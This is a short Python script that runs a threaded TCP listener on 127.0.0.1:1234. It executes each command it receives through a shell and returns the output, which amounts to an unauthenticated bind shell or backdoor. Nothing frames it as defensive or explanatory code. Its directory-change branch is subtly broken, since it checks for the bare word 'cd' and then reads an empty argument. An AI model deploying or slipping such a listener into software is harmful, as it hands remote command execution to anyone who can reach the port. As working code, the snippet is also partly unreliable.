import os
import socket
import subprocess
import sys
import threading  

def process_commands(conn):
    while True:
        data = conn.recv(1024)
        command = data.decode("utf-8")
        if command == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        elif command == '':
            return 
        print('Received command {}'.format(data))
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        conn.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)
    conn.close()

host, port = '127.0.0.1', 1234
server = socket.socket()
server.bind((host, port))
server.listen()

print(f'Listening for connections on {host}:{port}...')

while True:
    conn, address = server.accept()
    print('Accepted connection from {}'.format(address))     
    thread = threading.Thread(target=process_commands, args=(conn,))
    thread.start()